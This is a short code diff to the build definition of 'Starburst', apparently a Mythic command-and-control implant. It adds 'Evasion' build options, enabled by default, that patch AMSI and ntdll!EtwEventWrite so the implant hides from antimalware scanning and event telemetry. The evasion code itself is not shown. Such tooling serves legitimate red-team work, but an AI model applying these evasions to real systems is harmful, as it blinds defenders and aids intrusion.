@@ -28,7 +28,7 @@ class Starburst(PayloadType):
     mythic_encrypts = True
     translation_container = "StarburstTranslator"
 
-    agent_path = pathlib.Path(".") / "starburst"
+    agent_path = pathlib.Path(__file__).resolve().parent.parent
     agent_icon_path = agent_path / "assets" / "Starburst.png"
     agent_code_path = agent_path / "agent_code"
 
@@ -153,6 +153,20 @@ class Starburst(PayloadType):
             choices=["default", "full_image", "heap", "custom"],
             default_value="default",
             description="Sleep mask type: XOR sensitive fields only, full image encryption, heap masking, or custom",
+        ),
+        BuildParameter(
+            name="patch_amsi",
+            group_name="Evasion",
+            parameter_type=BuildParameterType.Boolean,
+            default_value=True,
+            description="Patch AMSI via hardware breakpoint before CLR operations (execute_assembly, powerpick). No code bytes modified.",
+        ),
+        BuildParameter(
+            name="patch_etw",
+            group_name="Evasion",
+            parameter_type=BuildParameterType.Boolean,
+            default_value=True,
+            description="Patch ntdll!EtwEventWrite at agent init to suppress CLR ETW telemetry (assembly loads, JIT events).",
         ),
     ]
 
@@ -601,6 +615,20 @@ class Starburst(PayloadType):
             "custom": "MASK_CUSTOM",
         }
         defines.append(f"#define SLEEP_MASK_TYPE {mask_map.get(mask, 'MASK_DEFAULT')}")
+
+        try:
+            patch_amsi = self.get_parameter("patch_amsi")
+        except Exception:
+            patch_amsi = True
+        if patch_amsi:
+            defines.append("#define INCLUDE_EVASION_AMSI")
+
+        try:
+            patch_etw = self.get_parameter("patch_etw")
+        except Exception:
+            patch_etw = True
+        if patch_etw:
+            defines.append("#define INCLUDE_EVASION_ETW")
 
         return "\n".join(defines)
 
